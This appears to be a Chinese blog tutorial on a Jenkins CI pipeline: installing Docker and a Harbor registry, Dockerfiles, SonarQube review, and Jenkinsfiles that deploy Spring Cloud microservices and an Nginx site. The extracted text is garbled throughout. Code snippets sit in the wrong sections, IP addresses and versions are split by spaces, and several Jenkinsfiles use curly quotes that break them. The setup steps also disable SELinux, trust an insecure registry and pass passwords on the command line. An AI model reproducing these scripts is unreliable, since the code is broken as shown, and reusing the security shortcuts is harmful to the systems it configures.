直接运行在宿主机内核上 并发性 一台宿主机上十几个，最多几十个 上百个，甚至数百上千个 性能 逊于宿主机 接近宿主机本地进程 资源利用率 低 高 Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流 行的 Linux 机器上，也可以实现虚拟化。 容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销 极低。 Docker容器技术 vs 传统虚拟机技术 简单一句话总结：Docker技术就是让我们更加高效轻松地将任何应用在Linux服务器部署和使用。 Docker安装 1 ）卸载旧版本 yum list installed | grep docker 列出当前所有docker的包 yum -y remove docker的包名称 卸载docker包 rm -rf /var/lib/docker 删除docker的所有镜像和容器 2 ）安装必要的软件包 sudo yum install -y yum-utils \\ device-mapper-persistent-data \\ lvm2 3 ）设置下载的镜像仓库 sudo yum-config-manager \\ –add-repo \\ https://download.docker.com/linux/centos/docker- ce.repo 4 ）列出需要安装的版本列表 yum list docker-ce –showduplicates | sort -r 5 ）安装指定版本（这里使用18.0.1版本） sudo yum install docker-ce-18.06.1.ce 6 ）查看版本 docker -v 7 ）启动Docker sudo systemctl start docker 启动 sudo systemctl enable docker 设置开机启动 8 ）添加阿里云镜像下载地址 vi /etc/docker/daemon.json 内容如下： 9 ）重启Docker sudo systemctl restart docker Docker基本命令快速入门 1 ）镜像命令 镜像：相当于应用的安装包，在Docker部署的任何应用都需要先构建成为镜像 docker search 镜像名称 搜索镜像 docker pull 镜像名称 拉取镜像 docker images 查看本地所有镜像 docker-ce.x 86 _ 64 3 : 18. 09. 1 - 3 .el 7 docker-ce-stable docker-ce.x 86 _ 64 3 : 18. 09. 0 - 3 .el 7 docker-ce-stable docker-ce.x 86 _ 64 18. 06. 1 .ce- 3 .el 7 docker-ce-stable docker-ce.x 86 _ 64 18. 06. 0 .ce- 3 .el 7 docker-ce-stable ...... { \"registry-mirrors\": [\"https://zydiol 88 .mirror.aliyuncs.com\"] } docker rmi -f 镜像名称 删除镜像 docker pull openjdk:8-jdk-alpine 2 ）容器命令 容器：容器是由镜像创建而来。容器是Docker运行应用的载体，每个应用都分别运行在Docker的每个 容器中。 docker run -i 镜像名称:标签 运行容器（默认是前台运行） docker ps 查看运行的容器 docker ps -a 查询所有容器 常用的参数： -i：运行容器 -d：后台守方式运行（守护式） –name：给容器添加名称 -p：公开容器端口给当前宿主机 -v：挂载目录 docker exec -it 容器ID/容器名称 /bin/bash 进入容器内部 docker start/stop/restart 容器名称/ID 启动/停止/重启容器 docker rm -f 容器名称/ID 删除容器 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:5:5","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"环境准备(2)-Dockerfile镜像脚本快速入门 Dockerfile简介 Dockerfile其实就是我们用来构建Docker镜像的源码，当然这不是所谓的编程源码，而是一些命令的组 合，只要理解它的逻辑和语法格式，就可以编写Dockerfile了。 简单点说，Dockerfile的作用：它可以让用户个性化定制Docker镜像。因为工作环境中的需求各式各 样，网络上的镜像很难满足实际的需求。 Dockerfile常见命令 命令 作用 FROM image_name:tag MAINTAINER user_name 声明镜像的作者 ENV key value 设置环境变量 (可以写多条) RUN command 编译镜像时运行的脚本(可以写多条) CMD 设置容器的启动命令 ENTRYPOINT 设置容器的入口程序 ADD source_dir/file dest_dir/file 将宿主机的文件复制到容器内，如果是一个压缩文件，将会在复 制后自动解压 COPY source_dir/file dest_dir/file 和ADD相似，但是如果有压缩文件并不能解压 WORKDIR path_dir 设置工作目录 ARG 设置编译镜像时加入的参数 VOLUMN 设置容器的挂载卷 镜像构建示意图： 可以看到，新镜像是从基础镜像一层一层叠加生成的。每安装一个软件，就在现有镜像的基础上增加一 层 RUN、CMD、ENTRYPOINT的区别？ RUN：用于指定 docker build 过程中要运行的命令，即是创建 Docker 镜像（image）的步骤 CMD：设置容器的启动命令， Dockerfile 中只能有一条 CMD 命令，如果写了多条则最后一条生效， CMD不支持接收docker run的参数。 ENTRYPOINT：入口程序是容器启动时执行的程序， docker run 中最后的命令将作为参数传递给入口 程序 ，ENTRYPOINY类似于 CMD 指令，但可以接收docker run的参数 。 以下是mysql官方镜像的Dockerfile示例： FROM oraclelinux: 7 - slim ARG MYSQL_SERVER_PACKAGE=mysql-community-server-minimal- 5. 7. 28 ARG MYSQL_SHELL_PACKAGE=mysql-shell- 8. 0. 18 使用Dockerfile制作微服务镜像 我们利用Dockerfile制作一个Eureka注册中心的镜像 1 ）上传Eureka的微服务jar包到linux 2 ）编写Dockerfile 3 ）构建镜像 docker build –build-arg JAR_FILE=tensquare_eureka_server-1.0-SNAPSHOT.jar -t eureka:v1. 4 ）查看镜像是否创建成功 docker images 5 ）创建容器 docker run -i –name=eureka -p 10086:10086 eureka:v1 6 ）访问容器 http://192.168.66.101:10086 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:5:6","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"环境准备(3)-Harbor镜像仓库安装及使用 Harbor简介 # Install server RUN yum install - y https://repo.mysql.com/mysql-community-minimal-release- el 7 .rpm \\ https://repo.mysql.com/mysql-community-release-el 7 .rpm \\ \u0026\u0026 yum-config-manager - -enable mysql 57 - server-minimal \\ \u0026\u0026 yum install - y \\ $MYSQL_SERVER_PACKAGE \\ $MYSQL_SHELL_PACKAGE \\ libpwquality \\ \u0026\u0026 yum clean all \\ \u0026\u0026 mkdir /docker-entrypoint-initdb.d VOLUME /var/lib/mysql COPY docker-entrypoint.sh /entrypoint.sh COPY healthcheck.sh /healthcheck.sh ENTRYPOINT [\"/entrypoint.sh\"] HEALTHCHECK CMD /healthcheck.sh EXPOSE 3306 33060 CMD [\"mysqld\"] FROM openjdk: 8 - jdk-alpine ARG JAR_FILE COPY ${JAR_FILE} app.jar EXPOSE 10086 ENTRYPOINT [\"java\",\"-jar\",\"/app.jar\"] Harbor（港口，港湾）是一个用于存储和分发Docker镜像的企业级Registry服务器。 除了Harbor这个私有镜像仓库之外，还有Docker官方提供的Registry。相对Registry，Harbor具有很 多优势： 提供分层传输机制，优化网络传输 Docker镜像是是分层的，而如果每次传输都使用全量文件(所以 用FTP的方式并不适合)，显然不经济。必须提供识别分层传输的机制，以层的UUID为标识，确定 传输的对象。 提供WEB界面，优化用户体验 只用镜像的名字来进行上传下载显然很不方便，需要有一个用户界 面可以支持登陆、搜索功能，包括区分公有、私有镜像。 支持水平扩展集群 当有用户对镜像的上传下载操作集中在某服务器，需要对相应的访问压力作分 解。 良好的安全机制 企业中的开发团队有很多不同的职位，对于不同的职位人员，分配不同的权限， 具有更好的安全性。 Harbor安装 Harbor需要安装在192.168.66.102上面 1 ）先安装Docker并启动Docker（已完成） 参考之前的安装过程 2 ）先安装docker-compose 3 ）给docker-compose添加执行权限 sudo chmod +x /usr/local/bin/docker-compose 4 ）查看docker-compose是否安装成功 docker-compose -version 5 ）下载Harbor的压缩包（本课程版本为：v1.9.2） https://github.com/goharbor/harbor/releases 6 ）上传压缩包到linux，并解压 tar -xzf harbor-offline-installer-v1.9.2.tgz mkdir /opt/harbor mv harbor/* /opt/harbor cd /opt/harbor 7 ）修改Harbor的配置 sudo curl - L https://github.com/docker/compose/releases/download/ 1. 21. 2 /docker- compose-$(uname - s)-$(uname - m) - o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose vi harbor.yml 修改hostname和port hostname: 192.168.66.102 port: 85 8 ）安装Harbor ./prepare ./install.sh 9 ）启动Harbor docker-compose up -d 启动 docker-compose stop 停止 docker-compose restart 重新启动 10 ）访问Harbor http://192.168.66.102:85 默认账户密码：admin/Harbor12345 在Harbor创建用户和项目 1 ）创建项目 Harbor的项目","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:5:7","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"微服务持续集成(1)-项目代码上传到Gitlab 在IDEA操作即可，参考之前的步骤。包括后台微服务和前端web网站代码 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:5:8","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"微服务持续集成(2)-从Gitlab拉取项目源码 1 ）创建Jenkinsfile文件 2 ）拉取Jenkinsfile文件 //gitlab的凭证 def git_auth = \" 68 f 2087 f-a 034 - 4 d 39 - a 9 ff- 1 f 776 dd 3 dfa 8 \" node { stage('拉取代码') { checkout([$class: 'GitSCM', branches: [[name: '*/${branch}']], doGenerateSubmoduleConfigurations: false, extensions: [], submoduleCfg: [], userRemoteConfigs: [[credentialsId: \"${git_auth}\", url: 'git@ 192. 168. 66. 100 :itheima_group/tensquare_back.git']]]) } } ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:5:9","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"微服务持续集成(3)-提交到SonarQube代码审查 1 ）创建项目，并设置参数 创建tensquare_back项目，添加两个参数 2 ）每个项目的根目录下添加sonar-project.properties 注意：修改sonar.projectKey和sonar.projectName 3 ）修改Jenkinsfile构建脚本 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:5:10","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"微服务持续集成(4)-使用Dockerfile编译、生成镜像 利用dockerfile-maven-plugin插件构建Docker镜像 1 ）在每个微服务项目的pom.xml加入dockerfile-maven-plugin插件 # must be unique in a given SonarQube instance sonar.projectKey=tensquare_zuul # this is the name and version displayed in the SonarQube UI. Was mandatory prior to SonarQube 6. 1. sonar.projectName=tensquare_zuul sonar.projectVersion= 1. 0 # Path is relative to the sonar-project.properties file. Replace \"\\\" by \"/\" on Windows. # This property is optional if sonar.modules is set. sonar.sources=. sonar.exclusions=**/test/**,**/target/** sonar.java.binaries=. sonar.java.source= 1. 8 sonar.java.target= 1. 8 sonar.java.libraries=**/target/classes/** # Encoding of the source code. Default is default system encoding sonar.sourceEncoding=UTF- 8 //gitlab的凭证 def git_auth = \" 68 f 2087 f-a 034 - 4 d 39 - a 9 ff- 1 f 776 dd 3 dfa 8 \" //构建版本的名称 def tag = \"latest\" node { stage('拉取代码') { checkout([$class: 'GitSCM', branches: [[name: '*/${branch}']], doGenerateSubmoduleConfigurations: false, extensions: [], submoduleCfg: [], userRemoteConfigs: [[credentialsId: \"${git_auth}\", url: 'git@ 192. 168. 66. 100 :itheima_group/tensquare_back.git']]]) } stage('代码审查') { def scannerHome = tool 'sonarqube-scanner' withSonarQubeEnv('sonarqube 6. 7. 4 ') { sh \"\"\" cd ${project_name} ${scannerHome}/bin/sonar-scanner \"\"\" } } } 2 ）在每个微服务项目根目录下建立Dockerfile文件 注意：每个项目公开的端口不一样 3 ）修改Jenkinsfile构建脚本 \u003cplugin\u003e \u003cgroupId\u003ecom.spotify\u003c/groupId\u003e \u003cartifactId\u003edockerfile-maven-plugin\u003c/artifactId\u003e \u003cversion\u003e 1. 3. 6 \u003c/version\u003e \u003cconfiguration\u003e \u003crepository\u003e${project.artifactId}\u003c/repository\u003e \u003cbuildArgs\u003e \u003cJAR_FILE\u003etarget/${project.build.finalName}.jar\u003c/JAR_FILE\u003e \u003c/buildArgs\u003e \u003c/configuration\u003e \u003c/plugin\u003e #FROM java: 8 FROM openjdk: 8 - jdk-alpine ARG JAR_FILE COPY ${JAR_FILE} app.jar EXPOSE 10086 ENTRYPOINT [\"java\",\"-jar\",\"/app.jar\"] //gitlab的凭证 def git_auth = \" 68 f 2087 f-a 034 - 4 d 39 - a 9 ff- 1 f 776 dd 3 dfa 8 \" //构建版本的名称 def tag = \"latest\" //Harbor私服地址 def harbor_url = \" 192. 168. 66. 102 : 85 /tensquare","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:5:11","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"微服务持续集成(5)-上传到Harbor镜像仓库 1 ）修改Jenkinsfile构建脚本 sh \"mvn - f tensquare_common clean install\" //编译，构建本地镜像 sh \"mvn - f ${project_name} clean package dockerfile:build\" } } //gitlab的凭证 def git_auth = \" 68 f 2087 f-a 034 - 4 d 39 - a 9 ff- 1 f 776 dd 3 dfa 8 \" //构建版本的名称 def tag = \"latest\" //Harbor私服地址 def harbor_url = \" 192. 168. 66. 102 : 85 \" //Harbor的项目名称 def harbor_project_name = \"tensquare\" //Harbor的凭证 def harbor_auth = \"ef 499 f 29 - f 138 - 44 dd- 975 e-ff 1 ca 1 d 8 c 933 \" node { stage('拉取代码') { checkout([$class: 'GitSCM', branches: [[name: '*/${branch}']], doGenerateSubmoduleConfigurations: false, extensions: [], submoduleCfg: [], userRemoteConfigs: [[credentialsId: \"${git_auth}\", url: 'git@ 192. 168. 66. 100 :itheima_group/tensquare_back.git']]]) } stage('代码审查') { def scannerHome = tool 'sonarqube-scanner' withSonarQubeEnv('sonarqube 6. 7. 4 ') { sh \"\"\" cd ${project_name} ${scannerHome}/bin/sonar-scanner \"\"\" } } stage('编译，构建镜像') { //定义镜像名称 def imageName = \"${project_name}:${tag}\" //编译，安装公共工程 sh \"mvn - f tensquare_common clean install\" //编译，构建本地镜像 sh \"mvn - f ${project_name} clean package dockerfile:build\" //给镜像打标签 sh \"docker tag ${imageName} ${harbor_url}/${harbor_project_name}/${imageName}\" 2 ）使用凭证管理Harbor私服账户和密码 先在凭证建立Harbor的凭证，在生成凭证脚本代码 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:5:12","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"微服务持续集成(6)-拉取镜像和发布应用 //登录Harbor，并上传镜像 withCredentials([usernamePassword(credentialsId: \"${harbor_auth}\", passwordVariable: 'password', usernameVariable: 'username')]) { //登录 sh \"docker login - u ${username} - p ${password} ${harbor_url}\" //上传镜像 sh \"docker push ${harbor_url}/${harbor_project_name}/${imageName}\" } //删除本地镜像 sh \"docker rmi - f ${imageName}\" sh \"docker rmi - f ${harbor_url}/${harbor_project_name}/${imageName}\" } } 注意：192.168.66.103服务已经安装Docker并启动 安装 Publish Over SSH 插件 安装以下插件，可以实现远程发送Shell命令 配置远程部署服务器 1 ）拷贝公钥到远程服务器 ssh-copy-id 192.168.66.103 2 ）系统配置-\u003e添加远程服务器 修改Jenkinsfile构建脚本 生成远程调用模板代码 添加一个port参数 //gitlab的凭证 def git_auth = \" 68 f 2087 f-a 034 - 4 d 39 - a 9 ff- 1 f 776 dd 3 dfa 8 \" //构建版本的名称 def tag = \"latest\" //Harbor私服地址 def harbor_url = \" 192. 168. 66. 102 : 85 \" //Harbor的项目名称 def harbor_project_name = “tensquare” //Harbor的凭证 def harbor_auth = “ef 499 f 29 - f 138 - 44 dd- 975 e-ff 1 ca 1 d 8 c 933 \" node { stage(‘拉取代码’) { checkout([$class: ‘GitSCM’, branches: [[name: ‘*/${branch}’]], doGenerateSubmoduleConfigurations: false, extensions: [], submoduleCfg: [], userRemoteConfigs: [[credentialsId: “${git_auth}”, url: ‘git@ 192. 168. 66. 100 :itheima_group/tensquare_back.git’]]]) } stage(‘代码审查’) { def scannerHome = tool ‘sonarqube-scanner’ withSonarQubeEnv(‘sonarqube 6. 7. 4 ‘) { sh \"”\" cd ${project_name} ${scannerHome}/bin/sonar-scanner \"\"\" } } stage(‘编译，构建镜像，部署服务’) { //定义镜像名称 def imageName = “${project_name}:${tag}” //编译并安装公共工程 sh “mvn - f tensquare_common clean install” //编译，构建本地镜像 sh “mvn - f ${project_name} clean package dockerfile:build” //给镜像打标签 sh “docker tag ${imageName} ${harbor_url}/${harbor_project_name}/${imageName}” //登录Harbor，并上传镜像 withCredentials([usernamePassword(credentialsId: “${harbor_auth}”, passwordVariable: ‘password’, usernameVariable: ‘username’)]) { //登录 sh “docker login - u ${username} - p ${password} ${harbor_url}” //上传镜像 sh “docker push ${harbor_url}/${harbor_project_name}/${imageName}” } //删除本地镜像 sh “docker rmi - f ${imageNa","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:5:13","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"微服务持续集成(7)-部署前端静态web网站 安装Nginx服务器 yum install epel-release yum -y install nginx 安装 修改nginx的端口，默认 80 ，改为 9090 ： vi /etc/nginx/nginx.conf 还需要关闭selinux，将SELINUX=disabled setenforce 0 先临时关闭 vi /etc/selinux/config 编辑文件，永久关闭 SELINUX=disabled 启动Nginx echo \"容器启动成功\" server { listen 9090 default_server; listen [::]: 9090 default_server; server_name _; root /usr/share/nginx/html; systemctl enable nginx 设置开机启动 systemctl start nginx 启动 systemctl stop nginx 停止 systemctl restart nginx 重启 访问：http://192.168.66.103:9090/ 安装NodeJS插件 Jenkins配置Nginx服务器 Manage Jenkins-\u003eGlobal Tool Configuration 创建前端流水线项目 建立Jenkinsfile构建脚本 完成后，访问：http://192.168.66.103:9090 进行测试。 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:5:14","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"5 、Jenkins+Docker+SpringCloud微服务持续集成(下) ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:6:0","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins+Docker+SpringCloud部署方案优化 //gitlab的凭证 def git_auth = \" 68 f 2087 f-a 034 - 4 d 39 - a 9 ff- 1 f 776 dd 3 dfa 8 \" node { stage('拉取代码') { checkout([$class: 'GitSCM', branches: [[name: '*/${branch}']], doGenerateSubmoduleConfigurations: false, extensions: [], submoduleCfg: [], userRemoteConfigs: [[credentialsId: \"${git_auth}\", url: 'git@ 192. 168. 66. 100 :itheima_group/tensquare_front.git']]]) } stage('打包，部署网站') { //使用NodeJS的npm进行打包 nodejs('nodejs 12 '){ sh ''' npm install npm run build ''' } //=====以下为远程调用进行项目部署======== sshPublisher(publishers: [sshPublisherDesc(configName: 'master_server', transfers: [sshTransfer(cleanRemote: false, excludes: '', execCommand: '', execTimeout: 120000 , flatten: false, makeEmptyDirs: false, noDefaultExcludes: false, patternSeparator: '[, ]+', remoteDirectory: '/usr/share/nginx/html', remoteDirectorySDF: false, removePrefix: 'dist', sourceFiles: 'dist/**')], usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)]) } } 上面部署方案存在的问题： 1 ）一次只能选择一个微服务部署 2 ）只有一台生产者部署服务器 3 ）每个微服务只有一个实例，容错率低 优化方案： 1 ）在一个Jenkins工程中可以选择多个微服务同时发布 2 ）在一个Jenkins工程中可以选择多台生产服务器同时部署 3 ）每个微服务都是以集群高可用形式部署 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:6:1","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"Jenkins+Docker+SpringCloud集群部署流程说明 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:6:2","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"修改所有微服务配置 注册中心配置(*) # 集群版 spring: application: name: EUREKA-HA server: port: 10086 spring: 指定profile=eureka-server 1 profiles: eureka-server 1 eureka: instance: 指定当profile=eureka-server 1 时，主机名是eureka-server 1 hostname: 192. 168. 66. 103 client: 在启动微服务的时候，加入参数: spring.profiles.active 来读取对应的配置 其他微服务配置 除了Eureka注册中心以外，其他微服务配置都需要加入所有Eureka服务 把代码提交到Gitlab中 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:6:3","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"设计Jenkins集群项目的构建参数 1 ）安装Extended Choice Parameter插件 支持多选框 2 ）创建流水线项目 service-url: # 将自己注册到eureka-server 1 、eureka-server 2 这个Eureka上面去 defaultZone: http:// 192. 168. 66. 103 : 10086 /eureka/,http:// 192. 168. 66. 104 : 10086 /eureka/ server: port: 10086 spring: profiles: eureka-server 2 eureka: instance: hostname: 192. 168. 66. 104 client: service-url: defaultZone: http:// 192. 168. 66. 103 : 10086 /eureka/,http:// 192. 168. 66. 104 : 10086 /eureka/ # Eureka配置 eureka: client: service-url: defaultZone: http:// 192. 168. 66. 103 : 10086 /eureka,http:// 192. 168. 66. 104 : 10086 /eureka # Eureka访 问地址 instance: prefer-ip-address: true 3 ）添加参数 字符串参数：分支名称 多选框：项目名称 最后效果： ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:6:4","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"完成微服务构建镜像，上传私服 tensquare_eureka_server@ 10086 ,tensquare_zuul@ 10020 ,tensquare_admin_service@ 9001 , tensquare_gathering@ 9002 //gitlab的凭证 def git_auth = \" 68 f 2087 f-a 034 - 4 d 39 - a 9 ff- 1 f 776 dd 3 dfa 8 \" //构建版本的名称 def tag = “latest” //Harbor私服地址 def harbor_url = \" 192. 168. 66. 102 : 85 \" //Harbor的项目名称 def harbor_project_name = “tensquare” //Harbor的凭证 def harbor_auth = “ef 499 f 29 - f 138 - 44 dd- 975 e-ff 1 ca 1 d 8 c 933 \" node { //把选择的项目信息转为数组 def selectedProjects = “${project_name}\".split(’,’) stage(‘拉取代码’) { checkout([$class: ‘GitSCM’, branches: [[name: ‘*/${branch}’]], doGenerateSubmoduleConfigurations: false, extensions: [], submoduleCfg: [], userRemoteConfigs: [[credentialsId: ‘${git_auth}’, url: ‘git@ 192. 168. 66. 100 :itheima_group/tensquare_back_cluster.git’]]]) } stage(‘代码审查’) { def scannerHome = tool ‘sonarqube-scanner’ withSonarQubeEnv(‘sonarqube 6. 7. 4 ‘) { for(int i= 0 ;i\u003cselectedProjects.size();i++){ //取出每个项目的名称和端口 def currentProject = selectedProjects[i]; //项目名称 def currentProjectName = currentProject.split(’@’)[ 0 ] //项目启动端口 def currentProjectPort = currentProject.split(’@’)[ 1 ] sh \"”” cd ${currentProjectName} ${scannerHome}/bin/sonar-scanner \"\"\" echo “${currentProjectName}完成代码审查” } } } stage(‘编译，构建镜像，部署服务’) { //编译并安装公共工程 sh “mvn - f tensquare_common clean install” for(int i= 0 ;i\u003cselectedProjects.size();i++){ //取出每个项目的名称和端口 def currentProject = selectedProjects[i]; //项目名称 def currentProjectName = currentProject.split(’@’)[ 0 ] //项目启动端口 def currentProjectPort = currentProject.split(’@’)[ 1 ] //定义镜像名称 def imageName = “${currentProjectName}:${tag}” //编译，构建本地镜像 ","date":"2021-04-06","objectID":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/:6:5","tags":["jenkins"],"title":"Jenkins持续集成入门到精通","uri":"/posts/jenkins%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/"},{"categories":["运维"],"content":"完成微服务多服务器远程发布 1 ）配置远程部署服务器 拷贝公钥到远程服务器 ssh-copy-id 192.168.66.104 系统配置-\u003e添加远程服务器 sh \"mvn - f ${currentProjectName} clean package dockerfile:build\" //给镜像打标签 sh \"docker tag ${imageName} ${harbor_url}/${harbor_project_name}/${imageName}\" //登录Harbor，并上传镜像 withCredentials([usernamePassword(credentialsId: \"${harbor_auth}\", passwordVariable: 'password', usernameVariable: 'username')]) { //登录 sh \"docker login - u ${username} - p ${password} ${harbor_url}\" //上传镜像 sh \"docker push ${harbor_url}/${harbor_project_name}/${imageName}\" } //删除本地镜像 sh \"docker rmi - f ${imageName}\" sh \"docker rmi - f ${harbor_url}/${harbor_project_name}/${imageName}\" //=====以下为远程调用进行项目部署======== //sshPublisher(publishers: [sshPublisherDesc(configName: 'master_server', transfers: [sshTransfer(cleanRemote: false, excludes: '', execCommand: \"/opt/jenkins_shell/deployCluster.sh $harbor_url $harbor_project_name $currentProjectName $tag $currentProjectPort\", execTimeout: 120000 , flatten: false, makeEmptyDirs: false, noDefaultExcludes: false, patternSeparator: '[, ]+', remoteDirectory: '', remoteDirectorySDF: false, removePrefix: '', sourceFiles: '')], usePromotionTimestamp: false, useWorkspaceInPromotion: false, verbose: false)]) echo \"${currentProjectName}完成编译，构建镜像\" } } } 2 ）修改Docker配置信任Harbor私服地址 重启Docker 3 ）添加参数 多选框：部署服务器 { \"registry-mirrors\": [\"https://zydiol 88 .mirror.aliyuncs.com\"], \"insecure-registries\": [\" 192. 168. 66. 102 : 85 \"] } 最终效果： 4 ）修改Jenkinsfile构建脚本 //gitlab的凭证 def git_auth = \" 68 f 2087 f-a 034 - 4 d 39 - a 9 ff- 1 f 776 dd 3 dfa 8 \" //构建版本的名称 def tag = \"latest\" //Harbor私服地址 def harbor_url = \" 192. 168. 66. 102 : 85 \" //Harbor的项目名称 def harbor_project_name = \"tensquare\" //Harbor的凭证 def harbor_auth = \"ef 499 f 29 - f 138 - 44 dd- 975 e-ff 1 ca 1 d 8 c 933 \" node { //把选择的项目信息转为数组 def selectedProjects = \"${project_name}\".split(',') 